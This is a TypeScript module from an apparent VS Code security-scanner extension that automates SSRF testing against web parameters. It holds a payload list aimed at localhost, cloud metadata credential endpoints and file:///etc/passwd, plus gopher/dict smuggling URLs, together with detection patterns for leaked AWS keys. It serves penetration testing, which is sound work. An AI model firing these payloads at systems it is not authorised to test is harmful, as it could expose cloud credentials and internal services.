/*---------------------------------------------------------------------------------------------
 *  Copyright (c) HikariSystem. All rights reserved.
 *  Licensed under the GPLv3 License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import * as vscode from 'vscode';
import type { ParameterTarget, SsrfScanResult, VulnFinding } from './types';

const DEFAULT_TIMEOUT_MS = 15_000;
const DEFAULT_DELAY_MS = 100;

const URL_PARAMETER_NAMES = [
	'url', 'uri', 'path', 'src', 'dest', 'redirect', 'link',
	'target', 'file', 'document', 'page', 'site', 'domain',
	'host', 'proxy',
];

interface SsrfPayload {
	name: string;
	value: string;
	category: 'localhost' | 'cloud-metadata' | 'protocol-smuggling' | 'internal-service';
	severity: 'critical' | 'high' | 'medium';
}

const SSRF_PAYLOADS: SsrfPayload[] = [
	// Localhost variants
	{ name: 'localhost-ip', value: 'http://127.0.0.1', category: 'localhost', severity: 'high' },
	{ name: 'localhost-name', value: 'http://localhost', category: 'localhost', severity: 'high' },
	{ name: 'localhost-ipv6', value: 'http://[::1]', category: 'localhost', severity: 'high' },
	{ name: 'localhost-zero', value: 'http://0.0.0.0', category: 'localhost', severity: 'high' },
	{ name: 'localhost-hex', value: 'http://0x7f000001', category: 'localhost', severity: 'high' },
	{ name: 'localhost-decimal', value: 'http://2130706433', category: 'localhost', severity: 'high' },

	// Cloud metadata endpoints
	{ name: 'aws-metadata', value: 'http://169.254.169.254/latest/meta-data/', category: 'cloud-metadata', severity: 'critical' },
	{ name: 'aws-metadata-iam', value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', category: 'cloud-metadata', severity: 'critical' },
	{ name: 'aws-user-data', value: 'http://169.254.169.254/latest/user-data/', category: 'cloud-metadata', severity: 'critical' },
	{ name: 'gcp-metadata', value: 'http://metadata.google.internal/', category: 'cloud-metadata', severity: 'critical' },
	{ name: 'gcp-metadata-project', value: 'http://metadata.google.internal/computeMetadata/v1/project/', category: 'cloud-metadata', severity: 'critical' },
	{ name: 'azure-metadata', value: 'http://169.254.169.254/metadata/', category: 'cloud-metadata', severity: 'critical' },
	{ name: 'azure-metadata-instance', value: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', category: 'cloud-metadata', severity: 'critical' },

	// Protocol smuggling
	{ name: 'file-etc-passwd', value: 'file:///etc/passwd', category: 'protocol-smuggling', severity: 'critical' },
	{ name: 'file-win-hosts', value: 'file:///c:/windows/system32/drivers/etc/hosts', category: 'protocol-smuggling', severity: 'critical' },
	{ name: 'dict-memcached', value: 'dict://localhost:11211/info', category: 'protocol-smuggling', severity: 'high' },
	{ name: 'gopher-smtp', value: 'gopher://localhost:25/', category: 'protocol-smuggling', severity: 'high' },

	// Internal service probing
	{ name: 'internal-8080', value: 'http://127.0.0.1:8080', category: 'internal-service', severity: 'high' },
	{ name: 'internal-3000', value: 'http://127.0.0.1:3000', category: 'internal-service', severity: 'high' },
	{ name: 'internal-6379', value: 'http://127.0.0.1:6379', category: 'internal-service', severity: 'high' },
	{ name: 'internal-9200', value: 'http://127.0.0.1:9200', category: 'internal-service', severity: 'high' },
	{ name: 'internal-27017', value: 'http://127.0.0.1:27017', category: 'internal-service', severity: 'high' },
	{ name: 'internal-5432', value: 'http://127.0.0.1:5432', category: 'internal-service', severity: 'high' },
];

interface SsrfResponse {
	statusCode: number;
	bodyText: string;
	elapsedMs: number;
	headers?: Record<string, string>;
}

// Detection patterns for SSRF confirmation
const AWS_METADATA_PATTERNS = [
	'ami-id', 'instance-id', 'security-credentials',
	'instance-type', 'local-hostname', 'local-ipv4',
	'public-hostname', 'public-ipv4', 'placement',
	'iam', 'AccessKeyId', 'SecretAccessKey',
];

const GCP_METADATA_PATTERNS = [
	'project-id', 'service-accounts', 'numeric-project-id',
	'project/project-id', 'instance/zone', 'instance/machine-type',
];

const INTERNAL_RESPONSE_PATTERNS = [
	'connection refused',
	'connection reset',
	'no route to host',
	'network is unreachable',
	'10\\.\\d+\\.\\d+\\.\\d+',
	'172\\.(1[6-9]|2[0-9]|3[01])\\.\\d+\\.\\d+',
	'192\\.168\\.\\d+\\.\\d+',
	'127\\.0\\.0\\.\\d+',
];

const FILE_CONTENT_PATTERNS = [
	'root:.*:0:0',           // /etc/passwd format
	'\\[fonts\\]',            // Windows hosts/ini
	'localhost',              // hosts file
	'\\[extensions\\]',       // Windows system files
];

async function sendSsrfRequest(
	targetUrl: string,
	param: ParameterTarget,
	payload: string,
	timeoutMs: number,
	headers?: Record<string, string>,
	cookie?: string,
): Promise<SsrfResponse | null> {
	try {
		const url = new URL(targetUrl);

		const sendOptions: Record<string, unknown> = {
			timeoutMs,
			followRedirects: false, // Important: do not follow redirects for SSRF detection
			quiet: true,
			maxBodyBytes: 64 * 1024,
		};

		if (headers) { sendOptions.headers = { ...headers }; }
		if (cookie) {
			sendOptions.headers = {
				...(sendOptions.headers as Record<string, string> ?? {}),
				cookie,
			};
		}

		if (param.location === 'query') {
			url.searchParams.set(param.name, payload);
			sendOptions.url = url.href;
			sendOptions.method = 'GET';
		} else if (param.location === 'body') {
			sendOptions.url = url.href;
			sendOptions.method = 'POST';
			sendOptions.body = `${encodeURIComponent(param.name)}=${encodeURIComponent(payload)}`;
			sendOptions.headers = {
				...(sendOptions.headers as Record<string, string> ?? {}),
				'content-type': 'application/x-www-form-urlencoded',
			};
		} else {
			return null;
		}

		const result = await vscode.commands.executeCommand<{
			response: {
				statusCode: number;
				bodyText: string;
				elapsedMs: number;
				headers?: Record<string, string>;
			};
		}>('scylla.http.sendHeadless', sendOptions);

		if (!result?.response) { return null; }
		return {
			statusCode: result.response.statusCode,
			bodyText: result.response.bodyText,
			elapsedMs: result.response.elapsedMs,
			headers: result.response.headers,
		};
	} catch {
		return null;
	}
}

function detectSsrfIndicators(
	response: SsrfResponse,
	payload: SsrfPayload,
	baselineElapsedMs: number,
): { detected: boolean; evidence: string; confidence: number } {
	const bodyLower = response.bodyText.toLowerCase();

	// Check for cloud metadata patterns
	if (payload.category === 'cloud-metadata') {
		const awsPatterns = AWS_METADATA_PATTERNS.filter(p => bodyLower.includes(p.toLowerCase()));
		if (awsPatterns.length > 0) {
			return {
				detected: true,
				evidence: `AWS metadata patterns found in response: ${awsPatterns.join(', ')}`,
				confidence: 0.95,
			};
		}

		const gcpPatterns = GCP_METADATA_PATTERNS.filter(p => bodyLower.includes(p.toLowerCase()));
		if (gcpPatterns.length > 0) {
			return {
				detected: true,
				evidence: `GCP metadata patterns found in response: ${gcpPatterns.join(', ')}`,
				confidence: 0.95,
			};
		}
	}

	// Check for file content patterns (protocol smuggling)
	if (payload.category === 'protocol-smuggling') {
		for (const pattern of FILE_CONTENT_PATTERNS) {
			const regex = new RegExp(pattern, 'i');
			if (regex.test(response.bodyText)) {
				return {
					detected: true,
					evidence: `File content pattern matched: ${pattern}`,
					confidence: 0.9,
				};
			}
		}
	}

	// Check for redirect-based SSRF (3xx with internal location)
	if (response.statusCode >= 300 && response.statusCode < 400 && response.headers) {
		const normalizedHeaders: Record<string, string> = {};
		for (const [key, value] of Object.entries(response.headers)) {
			normalizedHeaders[key.toLowerCase()] = value;
		}

		const location = normalizedHeaders['location'] ?? '';
		const locationLower = location.toLowerCase();
		if (
			locationLower.includes('127.0.0.1') ||
			locationLower.includes('localhost') ||
			locationLower.includes('169.254.169.254') ||
			locationLower.includes('[::1]') ||
			locationLower.includes('metadata.google.internal')
		) {
			return {
				detected: true,
				evidence: `Server redirected to internal address: ${location}`,
				confidence: 0.85,
			};
		}
	}

	// Check for internal response indicators in body
	for (const pattern of INTERNAL_RESPONSE_PATTERNS) {
		const regex = new RegExp(pattern, 'i');
		if (regex.test(response.bodyText)) {
			return {
				detected: true,
				evidence: `Internal network indicator found: matched pattern "${pattern}"`,
				confidence: 0.7,
			};
		}
	}

	// Response time anomaly: if the internal request took significantly less time than baseline,
	// it may indicate the server fetched from an internal resource
	if (baselineElapsedMs > 0 && response.elapsedMs > 0) {
		const timeDiff = response.elapsedMs - baselineElapsedMs;
		// If response time differs significantly (much faster suggesting internal, or much slower suggesting timeout)
		if (timeDiff > 5000) {
			return {
				detected: true,
				evidence: `Response time anomaly: ${response.elapsedMs}ms vs baseline ${Math.round(baselineElapsedMs)}ms (${Math.round(timeDiff)}ms slower, possible internal connection timeout)`,
				confidence: 0.5,
			};
		}
	}

	// Check if response body is substantially different length and contains unexpected content
	// This is a weak signal, only use when the body looks like it came from an internal service
	if (payload.category === 'internal-service' && response.statusCode === 200) {
		// Common internal service response signatures
		const internalSignatures = [
			'redis_version', 'redis_mode',                    // Redis
			'elasticsearch', 'cluster_name', 'cluster_uuid',  // Elasticsearch
			'mongodb', 'ismaster',                             // MongoDB
			'postgresql',                                      // PostgreSQL
		];
		for (const sig of internalSignatures) {
			if (bodyLower.includes(sig)) {
				return {
					detected: true,
					evidence: `Internal service signature "${sig}" found in response body`,
					confidence: 0.85,
				};
			}
		}
	}

	return { detected: false, evidence: '', confidence: 0 };
}

function autoDetectUrlParameters(parameters: ParameterTarget[]): ParameterTarget[] {
	if (parameters.length > 0) { return parameters; }

	// If no parameters provided, create synthetic parameters for common URL-type names
	return URL_PARAMETER_NAMES.map(name => ({
		name,
		value: 'https://example.com',
		location: 'query' as const,
	}));
}

export async function scanSsrf(
	targetUrl: string,
	parameters: ParameterTarget[],
	options: {
		delayMs?: number;
		timeoutMs?: number;
		headers?: Record<string, string>;
		cookie?: string;
	} = {}
): Promise<SsrfScanResult> {
	const delayMs = options.delayMs ?? DEFAULT_DELAY_MS;
	const timeoutMs = options.timeoutMs ?? DEFAULT_TIMEOUT_MS;

	const findings: VulnFinding[] = [];
	const start = Date.now();
	let parametersScanned = 0;

	const effectiveParams = autoDetectUrlParameters(parameters);

	// Get baseline response time using a safe external URL
	let baselineElapsedMs = 0;
	if (effectiveParams.length > 0) {
		const baselineParam = effectiveParams[0];
		const baselineResponse = await sendSsrfRequest(
			targetUrl, baselineParam, 'https://example.com', timeoutMs,
			options.headers, options.cookie,
		);
		if (baselineResponse) {
			baselineElapsedMs = baselineResponse.elapsedMs;
		}
	}

	for (const param of effectiveParams) {
		if (param.location !== 'query' && param.location !== 'body') { continue; }

		// Only test parameters that look like they might accept URLs
		const paramLower = param.name.toLowerCase();
		const isUrlParam = URL_PARAMETER_NAMES.some(name => paramLower.includes(name));
		if (!isUrlParam && parameters.length === 0) { continue; }

		parametersScanned++;
		let foundForParam = false;

		for (const payload of SSRF_PAYLOADS) {
			if (foundForParam) { break; } // One finding per parameter per category is enough

			const response = await sendSsrfRequest(
				targetUrl, param, payload.value, timeoutMs,
				options.headers, options.cookie,
			);

			if (!response) {
				if (delayMs > 0) { await sleep(delayMs); }
				continue;
			}

			const detection = detectSsrfIndicators(response, payload, baselineElapsedMs);

			if (detection.detected) {
				const categoryLabels: Record<string, string> = {
					'localhost': 'Localhost Access',
					'cloud-metadata': 'Cloud Metadata Access',
					'protocol-smuggling': 'Protocol Smuggling',
					'internal-service': 'Internal Service Access',
				};

				findings.push({
					type: 'ssrf',
					severity: payload.severity,
					title: `SSRF: ${categoryLabels[payload.category]} (${payload.name})`,
					url: targetUrl,
					parameter: param.name,
					payload: payload.value,
					evidence: detection.evidence,
					confidence: detection.confidence,
					details: `Server-Side Request Forgery detected in parameter "${param.name}" (${param.location}). The payload "${payload.value}" caused the server to make an internal request. Category: ${payload.category}. ${detection.evidence}. This vulnerability can be exploited to access internal services, cloud metadata (potentially leaking credentials), or read local files.`,
				});

				foundForParam = true;
			}

			if (delayMs > 0) { await sleep(delayMs); }
		}
	}

	return {
		generatedAt: new Date().toISOString(),
		target: targetUrl,
		parametersScanned,
		findings,
		elapsedMs: Date.now() - start,
	};
}

function sleep(ms: number): Promise<void> {
	return new Promise(resolve => setTimeout(resolve, ms));
}

export function generateSsrfReport(result: SsrfScanResult): string {
	const lines: string[] = [];
	lines.push('# Scylla Scanner - SSRF (Server-Side Request Forgery) Report');
	lines.push('');
	lines.push(`- **Target:** \`${result.target}\``);
	lines.push(`- **Parameters Scanned:** ${result.parametersScanned}`);
	lines.push(`- **Findings:** ${result.findings.length}`);
	lines.push(`- **Elapsed:** ${result.elapsedMs} ms`);
	lines.push(`- **Generated:** ${result.generatedAt}`);
	lines.push('');

	if (result.findings.length === 0) {
		lines.push('No SSRF vulnerabilities detected.');
	} else {
		for (const f of result.findings) {
			lines.push(`## ${f.title}`);
			lines.push('');
			lines.push(`- **Severity:** ${f.severity.toUpperCase()}`);
			if (f.parameter) {
				lines.push(`- **Parameter:** \`${f.parameter}\``);
			}
			lines.push(`- **Confidence:** ${Math.round(f.confidence * 100)}%`);
			lines.push(`- **Payload:** \`${f.payload}\``);
			lines.push(`- **Evidence:** ${f.evidence}`);
			lines.push('');
			lines.push(f.details);
			lines.push('');
		}
	}

	return lines.join('\n');
}
